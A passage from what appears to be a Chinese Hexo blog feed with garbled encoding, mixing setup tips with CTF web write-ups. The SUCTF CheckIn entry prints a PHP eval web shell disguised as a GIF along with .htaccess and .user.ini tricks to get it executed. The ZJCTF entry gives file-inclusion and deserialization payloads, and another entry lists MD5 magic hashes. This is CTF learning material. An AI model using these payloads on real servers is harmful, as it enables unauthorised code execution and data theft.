href="#ç‚¹å‡»åŠ«æŒï¼ˆClickjackingï¼‰" class="headerlink" title="ç‚¹å‡»åŠ«æŒï¼ˆClickjackingï¼‰"></a>ç‚¹å‡»åŠ«æŒï¼ˆClickjackingï¼‰</h4><p>ç‚¹å‡»åŠ«æŒï¼ˆClickjackingï¼‰æ˜¯æŒ‡åˆ©ç”¨é€æ˜çš„æŒ‰é’®æˆ–é“¾æ¥åšæˆé™·é˜±ï¼Œè¦†ç›–åœ¨ Web é¡µé¢ä¹‹ä¸Šã€‚ç„¶åè¯±ä½¿ç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œç‚¹å‡»é‚£ä¸ªé“¾æ¥è®¿é—®å†…å®¹çš„ä¸€ç§æ”»å‡»æ‰‹æ®µã€‚è¿™ç§è¡Œä¸ºåˆç§°ä¸ºç•Œé¢ä¼ªè£…ï¼ˆUI Redressingï¼‰ã€‚</p><h4 id="DoS-æ”»å‡»ï¼ˆDenial-of-Service-attackï¼‰"><a href="#DoS-æ”»å‡»ï¼ˆDenial-of-Service-attackï¼‰" class="headerlink" title="DoS æ”»å‡»ï¼ˆDenial of Service attackï¼‰"></a>DoS æ”»å‡»ï¼ˆDenial of Service attackï¼‰</h4><p>DoS æ”»å‡»ï¼ˆDenial of Service attackï¼‰æ˜¯ä¸€ç§è®©è¿è¡Œä¸­çš„æœåŠ¡å‘ˆåœæ­¢çŠ¶æ€çš„æ”»å‡»ã€‚æœ‰æ—¶ä¹Ÿå«åšæœåŠ¡åœæ­¢æ”»å‡»æˆ–æ‹’ç»æœåŠ¡æ”»å‡»ã€‚DoS æ”»å‡»çš„å¯¹è±¡ä¸ä»…é™äº Web ç½‘ç«™ï¼Œè¿˜åŒ…æ‹¬ç½‘ç»œè®¾å¤‡åŠæœåŠ¡å™¨ç­‰ã€‚</p><h4 id="åé—¨ç¨‹åºï¼ˆBackdoorï¼‰"><a href="#åé—¨ç¨‹åºï¼ˆBackdoorï¼‰" class="headerlink" title="åé—¨ç¨‹åºï¼ˆBackdoorï¼‰"></a>åé—¨ç¨‹åºï¼ˆBackdoorï¼‰</h4><p>åé—¨ç¨‹åºï¼ˆBackdoorï¼‰æ˜¯æŒ‡å¼€å‘è®¾ç½®çš„éšè—å…¥å£ï¼Œå¯ä¸æŒ‰æ­£å¸¸æ­¥éª¤ä½¿ç”¨å—é™åŠŸèƒ½ã€‚åˆ©ç”¨åé—¨ç¨‹åºå°±èƒ½å¤Ÿä½¿ç”¨åŸæœ¬å—é™åˆ¶çš„åŠŸèƒ½ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºhexoæ’å…¥å›¾ç‰‡</title>
      <link href="/2021/04/21/guan-yu-hexo-cha-ru-tu-pian/"/>
      <url>/2021/04/21/guan-yu-hexo-cha-ru-tu-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo-åšæ–‡ä¸­å›¾ç‰‡éƒ¨ç½²"><a href="#hexo-åšæ–‡ä¸­å›¾ç‰‡éƒ¨ç½²" class="headerlink" title="hexo åšæ–‡ä¸­å›¾ç‰‡éƒ¨ç½²"></a>hexo åšæ–‡ä¸­å›¾ç‰‡éƒ¨ç½²</h1><p>åœ¨<code>source</code>ä¸‹åˆ›å»ºä¸€ä¸ª<code>images</code>ç›®å½•ï¼Œå­˜æ”¾å›¾ç‰‡</p><p>å¼•ç”¨æ–¹å¼</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>images<span class="token operator">/</span>xxx<span class="token operator">.</span>jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹Ÿå¯ä»¥ä¸ºæ¯æ¡åšæ–‡åˆ†åˆ«åˆ›å»º</p><p>åœ¨_postç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªä¸mdåŒåçš„æ–‡ä»¶å¤¹æ”¾å›¾ç‰‡</p><p>åº”ç”¨æ–¹å¼</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>xxx<span class="token operator">.</span>jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨æ„è¿™é‡Œæ˜¯<code>\</code>,windowsä¸‹æ˜¯<code>/</code></p>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux(kali)å®‰è£…vm-tools</title>
      <link href="/2021/04/11/linux-an-zhuang-vm-tools/"/>
      <url>/2021/04/11/linux-an-zhuang-vm-tools/</url>
      
        <content type="html"><![CDATA[<h2 id="linux-kali-å®‰è£…vm-tools"><a href="#linux-kali-å®‰è£…vm-tools" class="headerlink" title="linux(kali)å®‰è£…vm-tools"></a>linux(kali)å®‰è£…vm-tools</h2><h3 id="1-å®‰è£…vmwareè‡ªå¸¦çš„"><a href="#1-å®‰è£…vmwareè‡ªå¸¦çš„" class="headerlink" title="1.å®‰è£…vmwareè‡ªå¸¦çš„"></a>1.å®‰è£…vmwareè‡ªå¸¦çš„</h3><p>å®‰è£…å®Œlinuxåï¼Œå³å‡»å®‰è£…çš„è™šæ‹Ÿæœºï¼Œç‚¹å‡»å®‰è£…vmware-tools</p><p><img src="https://z3.ax1x.com/2021/04/12/c0o4df.png" alt="c0o4df.png"></p><p>å†ç‚¹å‡»å›¾ä¸­çº¢çº¿ä¸Šçš„å…‰ç›˜</p><p><img src="https://z3.ax1x.com/2021/04/12/c0o5o8.png" alt="c0o5o8.png"></p><p>å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹<code>tools</code> <code>mkdir tools</code></p><p>è¿›å…¥åˆšæ‰æ‰“å¼€å…‰ç›˜çš„ç›®å½• <code>cd /media/cdrom0</code></p><p>å°†å‹ç¼©åŒ…ç§»åˆ°åˆšæ‰åˆ›å»ºçš„æ–‡ä»¶å¤¹toolsä¸‹  <code>cp VMwareTools-10.3.22-15902021.tar.gz /tools/</code></p><p>åœ¨è¿›å…¥åˆ›å»ºçš„æ–‡ä»¶å¤¹</p><p>è§£å‹<code>tar -xf VMwareTools-10.3.22-15902021.tar.gz </code></p><p><img src="https://z3.ax1x.com/2021/04/12/c0ooFS.png" alt="c0ooFS.png"></p><p>è¿›å…¥<code>vmware-tools-distrib</code></p><p>æ‰§è¡Œå®‰è£…<code>./vmware-install.pl</code></p><p>ç„¶åä¸€è·¯enter</p><h3 id="2-å®‰è£…kaliè‡ªå¸¦çš„"><a href="#2-å®‰è£…kaliè‡ªå¸¦çš„" class="headerlink" title="2.å®‰è£…kaliè‡ªå¸¦çš„"></a>2.å®‰è£…kaliè‡ªå¸¦çš„</h3><p><code>apt-get install open-vm-tools-desktop fuse</code></p><h2 id="ä¸€äº›é—®é¢˜"><a href="#ä¸€äº›é—®é¢˜" class="headerlink" title="ä¸€äº›é—®é¢˜"></a>ä¸€äº›é—®é¢˜</h2><h3 id="é‡æ–°å®‰è£…vm-toolsæ˜¯ç°è‰²çš„"><a href="#é‡æ–°å®‰è£…vm-toolsæ˜¯ç°è‰²çš„" class="headerlink" title="é‡æ–°å®‰è£…vm-toolsæ˜¯ç°è‰²çš„"></a>é‡æ–°å®‰è£…vm-toolsæ˜¯ç°è‰²çš„</h3><p><img src="https://z3.ax1x.com/2021/04/12/c0o7WQ.png" alt="c0o7WQ.png"></p><p>å¦‚å›¾ï¼Œå¯ä»¥ç‚¹å‡»ç¼–è¾‘è™šæ‹Ÿæœºè®¾ç½®</p><p>ç„¶åå°†CD/DVDæ¢ä¸ºè‡ªåŠ¨æ£€æŸ¥æˆ–è€…æ–°å»ºä¸€ä¸ªï¼Œç„¶åå¼€å¯è™šæ‹Ÿæœºå®‰è£…vm-toolsï¼Œä¹‹åå¯ä»¥æ”¹å›æ¥</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç‰©ç†æœºsshè¿æ¥ä¸ä¸Šè™šæ‹Ÿæœº</title>
      <link href="/2021/04/05/wu-li-ji-ssh-lian-jie-bu-shang-xu-ni-ji/"/>
      <url>/2021/04/05/wu-li-ji-ssh-lian-jie-bu-shang-xu-ni-ji/</url>
      
        <content type="html"><![CDATA[<p>ä¿è¯è™šæ‹Ÿæœºè¿å¾—ä¸Šç½‘ï¼Œæ¯”å¦‚èƒ½pingç™¾åº¦</p><p>æœ€ç®€å•åŠæ³•</p><p><img src="https://z3.ax1x.com/2021/04/05/cQclWV.png" alt="cQclWV.png"></p><p>ç‚¹å‡»æ›´æ”¹è®¾ç½®è·å–ç®¡ç†å‘˜æƒé™</p><p><img src="https://z3.ax1x.com/2021/04/05/cQc1zT.png" alt="cQc1zT.png"></p><p>ç„¶åè¿˜åŸ</p><p><img src="https://z3.ax1x.com/2021/04/05/cQcNw9.png" alt="cQcNw9.png"></p>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF_2019 CheckIn</title>
      <link href="/2021/04/01/suctf-2019-checkin/"/>
      <url>/2021/04/01/suctf-2019-checkin/</url>
      
        <content type="html"><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>å°è¯•æäº¤<img src="https://z3.ax1x.com/2021/04/01/cVvgMt.png" alt="cVvgMt.png"></p><p>illegal suffix</p><p>å°è¯•ä¿®æ”¹åç¼€å’ŒContent-Typeå­—æ®µï¼Œè¿˜æ˜¯ä¸åˆæ³•</p><p>ä¿®æ”¹åç¼€ä¸ºjpgï¼Œå†æ¬¡ä¸Šä¼ </p><p><img src="https://z3.ax1x.com/2021/04/01/cVvrPH.png" alt="cVvrPH.png"></p><p>ä¸èƒ½æœ‰&lt;?ï¼Œä¿®æ”¹æ–‡ä»¶å†…å®¹</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">&gt;</span>@<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/04/01/cVxVoD.png" alt="cVxVoD.png"></p><p>exif_imagetypeå‡½æ•°</p><p>åœ¨å¤´éƒ¨åŠ ä¸ªå›¾ç‰‡å¹»æ•°</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">GIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">&gt;</span>@<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/04/01/cVxYFg.png" alt="cVxYFg.png"></p><p>è®¿é—®å›¾ç‰‡ï¼Œç¡®å®æˆåŠŸäº†</p><p><img src="https://z3.ax1x.com/2021/04/01/cVx5m6.png" alt="cVx5m6.png"></p><p>æˆåŠŸï¼Œä½†æ˜¯è¦è¿æ¥éœ€è¦æŠŠå®ƒè§£é‡Šä¸ºphpæ–‡ä»¶</p><p>ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">GIF89aSetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token punctuation">.</span>jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/04/01/cVxLpd.png" alt="cVxLpd.png"></p><p>ç”¨èšå‰‘è¿æ¥æ²¡æœ‰æˆåŠŸï¼Œå¯èƒ½ä¸­é—´ä»¶ä¸æ˜¯Apache</p><p>å¯ä»¥æ”¹ç”¨ä¸Šä¼ <code>.uesr.ini</code>æ–‡ä»¶</p><p>ä½¿ç”¨æ¡ä»¶</p><p>ä¸Šä¼ é©¬çš„æ–‡ä»¶å¤¹æœ‰phpæ–‡ä»¶</p><p>åŸç†ï¼šå­˜åœ¨phpæ–‡ä»¶ï¼Œå°±ä¼šå‘ç›®å½•é‡ŒæŸ¥æ‰¾.jpgï¼Œè§£æä¸ºphp</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">GIF89aauto_prepend_file<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">.</span>jpgå¦‚æœå‰é¢çš„é©¬å†™çš„æ˜¯GIF89a<span class="token operator">&lt;</span><span class="token operator">%</span> @<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">&gt;</span>åˆ™åŠ ä¸€è¡ŒGIF89aauto_prepend_file<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">.</span>jpgasp_tags<span class="token operator">=</span>on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/04/01/cVxz0f.png" alt="cVxz0f.png"></p><p>è¿æ¥</p><p><img src="https://z3.ax1x.com/2021/04/01/cVz9AS.png" alt="cVz9AS.png"></p><p>æˆåŠŸï¼Œåœ¨æ ¹ç›®å½•æ‰¾åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZJCTF_2019 NiZhuanSiWei</title>
      <link href="/2021/04/01/zjctf-2019-nizhuansiwei/"/>
      <url>/2021/04/01/zjctf-2019-nizhuansiwei/</url>
      
        <content type="html"><![CDATA[<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>è¿›å…¥é¡µé¢ä¾¿æ˜¯ä»£ç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;&lt;h1&gt;"</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h1&gt;&lt;/br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Not now!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//useless.php</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»£ç å®¡è®¡</p><p><code>file_get_contents($text,'r')==="welcome to the zjctf"</code>è¯»å–$textå†…å®¹ä¸åé¢æ¯”è¾ƒ</p><p><code>file_get_contents</code>å¯ä»¥ç”¨åˆ°ä¼ªåè®®</p><p>enctype=â€multipart/form-dataâ€ çš„æ—¶å€™ php://input æ˜¯æ— æ•ˆçš„</p><p>æ„é€ payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>welcome to the zjctf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>preg_match("/flag/",$file)</code>fileä¸èƒ½åŒ…å«flag</p><p><code>include($file);  //useless.php</code>åŒ…å«æ–‡ä»¶</p><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resoure=useless.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>welcome to the zjctf<span class="token operator">&amp;</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=useless.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è§£ç çš„</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token delimiter important">?&gt;</span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$password = unserialize($password);</code>ååºåˆ—åŒ–å‡½æ•°</p><p>å°†ä¸Šé¢ä¸€ä¸ªç±»åºåˆ—åŒ–</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Flag"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token number">123</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">125</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€ç»ˆpayload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>welcome to the zjctf<span class="token operator">&amp;</span>file<span class="token operator">=</span>useless<span class="token operator">.</span>php<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Flag"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token number">123</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">125</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€åctrl+UæŸ¥çœ‹flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å“ˆå¸Œç¢°æ’è¡¨</title>
      <link href="/2021/03/31/ha-xi-peng-zhuang/"/>
      <url>/2021/03/31/ha-xi-peng-zhuang/</url>
      
        <content type="html"><![CDATA[<h3 id="å“ˆå¸Œç¢°æ’è¡¨"><a href="#å“ˆå¸Œç¢°æ’è¡¨" class="headerlink" title="å“ˆå¸Œç¢°æ’è¡¨"></a>å“ˆå¸Œç¢°æ’è¡¨</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">0</span>eå¼€å¤´çš„md5å’ŒåŸå€¼ï¼šs878926199a<span class="token number">0e545993274517709034328855841020</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1184209335a<span class="token number">0e072485820392773389523109082030</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s532378020a<span class="token number">0e220463095855511507588041205815</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s878926199a<span class="token number">0e545993274517709034328855841020</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020 Easy MD5</title>
      <link href="/2021/03/31/bjdctf2020-easy-md5/"/>
      <url>/2021/03/31/bjdctf2020-easy-md5/</url>
      
        <content type="html"><![CDATA[<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>æŸ¥çœ‹æºç </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>leveldo4.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>password<span class="token punctuation">'</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>in<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>give<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>              <span class="token 